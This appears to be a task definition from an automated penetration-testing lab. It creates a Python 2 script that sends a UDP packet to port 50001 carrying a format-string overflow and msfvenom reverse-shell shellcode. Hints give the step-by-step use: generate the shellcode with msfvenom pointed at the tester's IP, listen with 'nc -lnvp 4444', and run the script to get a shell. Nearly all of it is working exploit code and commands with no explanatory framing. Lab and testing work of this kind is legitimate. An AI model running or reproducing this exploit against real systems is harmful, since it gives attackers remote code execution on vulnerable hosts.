description: create and send reverse shell by python2
function: create_file
In: [IP]
condition: 
Out: []
argument:
  - |
    #!/usr/bin/env python
    import struct
    import socket
    import sys

    ip = 'REPLACE_IT_IP' #change this
    port = 50001
    def gen_discover_packet(ad_id, os, hn, user, inf, func):
      d  = chr(0x3e)+chr(0xd1)+chr(0x1)
      d += struct.pack('>I', ad_id)
      d += struct.pack('>I', 0)
      d += chr(0x2)+chr(os)
      d += struct.pack('>I', len(hn)) + hn
      d += struct.pack('>I', len(user)) + user
      d += struct.pack('>I', 0)
      d += struct.pack('>I', len(inf)) + inf
      d += chr(0)
      d += struct.pack('>I', len(func)) + func
      d += chr(0x2)+chr(0xc3)+chr(0x51)
      return d

    #change this 
    #msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
    shellcode =  b""
    shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
    shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x63\x40\x04"
    shellcode += b"\x9d\x65\x60\xc6\xfb\x48\x31\x58\x27\x48\x2d"
    shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x09\x69\x5c\x04\x0f"
    shellcode += b"\x62\x99\x91\x62\x1e\x0b\x98\x2d\xf7\x8e\x42"
    shellcode += b"\x61\x40\x15\xc1\x6f\x6a\xa4\x65\x32\x08\x8d"
    shellcode += b"\x7b\x0f\x70\x9c\x91\x49\x18\x0b\x98\x0f\x63"
    shellcode += b"\x98\xb3\x9c\x8e\x6e\xbc\x3d\x6f\xc3\x8e\x95"
    shellcode += b"\x2a\x3f\xc5\xfc\x28\x7d\xd4\x01\x29\x6a\xb2"
    shellcode += b"\x16\x08\xc6\xa8\x2b\xc9\xe3\xcf\x32\x28\x4f"
    shellcode += b"\x1d\x6c\x45\x04\x9d\x65\x60\xc6\xfb"

    print('sending payload ...')
    p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(p, (ip, port))
    s.close()
    print('reverse shell should connect within 5 seconds')
  - reverse_shell.py
hint:
  - +FORMAT+Open another terminal, enter `msfvenom -p linux/x64/shell_reverse_tcp LHOST={Data["myIP"]} LPORT=4444 -b "\\x00\\x25\\x26" -f python -v shellcode` to generate shellcode.
  - +FORMAT+Copy shellcode generated by above command and replace the shellcode in /home/{getpass.getuser()}/Desktop/reverse_shell.py
  - Enter `nc -lnvp 4444` to listen to port.
  - +FORMAT+Open another terminal, enter `python2 /home/{getpass.getuser()}/Desktop/reverse_shell.py`, and you will get shell.
